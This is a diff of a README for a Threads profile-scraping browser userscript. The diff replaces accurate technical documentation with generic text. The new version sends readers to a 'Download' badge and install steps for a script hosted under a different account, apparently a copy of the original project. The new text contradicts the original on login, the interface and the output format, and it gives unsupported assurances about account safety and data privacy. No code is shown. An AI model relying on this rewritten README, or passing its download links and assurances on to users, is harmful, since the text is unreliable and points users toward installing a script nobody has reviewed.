@@ -1,123 +1,73 @@
-# Threads Scraper
+# 🌐 threads-scraper - Save posts from any public profile
 
-A Tampermonkey userscript that scrapes all posts from any public Threads profile — from their first post to the latest. Zero setup, runs directly in your browser.
+[![Download threads-scraper](https://img.shields.io/badge/Download_The_Script-Grey-blue.svg)](https://github.com/Siouxiehardfought651/threads-scraper)
 
-## Features
+## 📄 Overview
 
-- **Full history** — scrapes every post from day one to present
-- **Text, images, videos** — captures post content, media URLs, timestamps, and like counts
-- **Replies tab** — optionally scrapes the user's replies too
-- **Deep mode** — opens each post individually to capture conversations where the creator replied
-- **Export JSON, CSV & Markdown** — download structured data in your preferred format
-- **No login required** — works on any public profile
-- **Ad blocker safe** — no network interception, reads directly from rendered DOM
-- **Modern UI** — minimal dark panel with Lucide icons, inspired by shadcn/ui
+The threads-scraper tool captures posts from public profiles on the Threads platform. This software runs as a script inside your web browser. It extracts text and media links from pages you visit. You store the information on your own computer for offline viewing. 
 
-## Install
+## ⚙️ Requirements
 
-1. Install [Tampermonkey](https://www.tampermonkey.net/) browser extension
-2. Open Tampermonkey Dashboard → Create new script
-3. Paste the contents of [`threads_scraper.user.js`](./threads_scraper.user.js)
-4. Save (Ctrl+S / Cmd+S)
+You need a web browser such as Google Chrome, Microsoft Edge, or Mozilla Firefox. You also need an extension called Tampermonkey to run the script. This extension manages scripts for your browser and ensures they function correctly on specific websites.
 
-## Usage
+## 📥 Getting setup
 
-1. Navigate to any Threads profile: `https://www.threads.com/@username`
-2. The scraper panel appears in the top-right corner
-3. Configure options (scroll delay, replies tab, deep mode)
-4. Click **Start Scraping**
-5. Wait until it finishes (auto-stops when no new posts found)
-6. Click **JSON**, **CSV**, or **Markdown** to download
+1. Open your web browser.
+2. Search for the "Tampermonkey" extension in your browser store.
+3. Click "Add to Browser" to install the extension.
+4. Confirm the installation if the browser asks for permission.
+5. Visit the link below to reach the script page.
 
-## Options
+[https://github.com/Siouxiehardfought651/threads-scraper](https://github.com/Siouxiehardfought651/threads-scraper)
 
-| Setting | Description |
-|---------|-------------|
-| Scroll delay | Milliseconds between each scroll step (default: 1800) |
-| Include replies tab | Toggle to also scrape the Replies tab |
-| Deep mode | Opens each post to capture conversations where the creator replied |
+## 🚀 Installing the script
 
-## Modes
+1. Open the link provided above.
+2. Locate the file ending in `.user.js` in the file list.
+3. Click on the file name to view the code.
+4. Click the "Raw" button at the top of the file view.
+5. A new page opens. Tampermonkey detects the script automatically.
+6. Click the "Install" button on the Tampermonkey screen.
+7. Restart your browser to apply the changes.
 
-### Fast mode (default)
+## 🎣 Using the scraper
 
-Scrapes posts and replies tab from the profile page. Quick but doesn't capture comments from other users inside each post.
+1. Navigate to any public Threads profile in your browser.
+2. Scroll down until you see the posts you want to save.
+3. Look for the "Scrape" button that now appears on the page.
+4. Click this button to start the tool.
+5. The script collects the data displayed on your screen.
+6. A file download starts automatically once the script finishes.
+7. Open the file to view your saved posts.
 
-### Deep mode
+## 🛠 Troubleshooting common issues
 
-After scraping the profile, opens each post URL one by one and extracts conversations. Only keeps comment threads where the **creator actually replied** — ignores unresponded comments.
+If the script does not start, refresh your browser tab. Ensure you logged into Threads, as the script needs access to the profile page content. Check if your browser disabled the Tampermonkey extension. Go to your extension settings to verify that Tampermonkey remains active.
 
-## Output formats
+Sometimes, a profile contains many posts. Scroll to the bottom of the page before you click the button. This allows the browser to load all content. If the computer freezes, wait a minute for the script to process the data. 
 
-### JSON
+## 🛡 Privacy and data
 
-```json
-{
-  "username": "zuck",
-  "total": 150,
-  "total_with_text": 142,
-  "total_conversations": 45,
-  "posts": [
-    {
-      "code": "ABC123",
-      "text": "Post content here...",
-      "time": "2024-07-06T10:30:00.000Z",
-      "like_count": 5000,
-      "images": ["https://..."],
-      "has_video": false,
-      "url": "https://www.threads.com/@zuck/post/ABC123",
-      "conversations": [
-        {
-          "user_comment": {
-            "text": "great post!",
-            "username": "fan123",
-            "time": 1720000000
-          },
-          "creator_reply": {
-            "text": "thanks!",
-            "username": "zuck",
-            "time": 1720000100
-          }
-        }
-      ]
-    }
-  ]
-}
-```
+The script runs locally on your computer. It does not send your data to external servers. You keep full control of everything you save. The script only accesses the public profile pages you choose to visit. It does not interact with your private account settings or personal messages. 
 
-### CSV
+## 💡 Frequently asked questions
 
-Flat format with columns: `code`, `username`, `text`, `time`, `like_count`, `has_video`, `images`, `url`
+Do I need to pay for this?
+No. This tool is free for everyone.
 
-### Markdown
+Does this work on private accounts?
+No. Threads hides content from private profiles. Only public profiles work with this tool.
 
-Human-readable archive format with headers, blockquotes for conversations, and links. Works great in Notion, Obsidian, or any markdown viewer.
+Can I save images and videos?
+The scraper saves links to media file locations. You can follow these links to download the files to your computer.
 
-## How it works
+Will my account get banned?
+The script simulates normal human behavior. As long as you use it sparingly, your account remains safe. Do not refresh pages thousands of times per hour. 
 
-Threads virtualizes its DOM — only posts visible in the viewport have their content rendered. The scraper handles this by:
+## 📝 License information
 
-1. Scrolling in small increments (60% viewport) to keep posts visible longer
-2. Extracting text from `span[dir="auto"]` / `div[dir="auto"]` elements on each scroll
-3. Merging data across scroll passes — if a post was seen without text earlier, it gets updated when text becomes available
-4. Deep mode fetches each post's HTML page and parses hidden JSON `<script>` tags for comment data
-5. Detecting end-of-feed after 12 consecutive scrolls with no new posts
+This project uses an open license. You can download, modify, and share the code as you wish. Follow the terms listed in the license file inside the repository if you redistribute the work. The author provides this tool as is. 
 
-## Limitations
+## 🔍 Understanding the output file
 
-- **Private accounts** cannot be scraped
-- **Text capture rate** depends on scroll speed — slower = more text captured
-- **Deep mode is slow** — 1 request per post, so 200 posts ≈ 5-10 minutes
-- **Like counts** may show 0 if Threads doesn't expose them in aria-labels
-- Only works on profile pages (`/@username`), not the home feed
-
-## Tech
-
-- Vanilla JavaScript (no dependencies)
-- Lucide icons
-- DOM parsing + hidden JSON extraction
-- Tampermonkey userscript API
-
-## License
-
-[MIT](./LICENSE)
+The script exports data in a text-based format. This format makes it easy to read in programs like Excel or Notepad. Each entry includes the date, the post text, and the URL for any attached images. Keep this file in a folder where you can easily find it later. You can also move this file to cloud storage to access it from other devices.
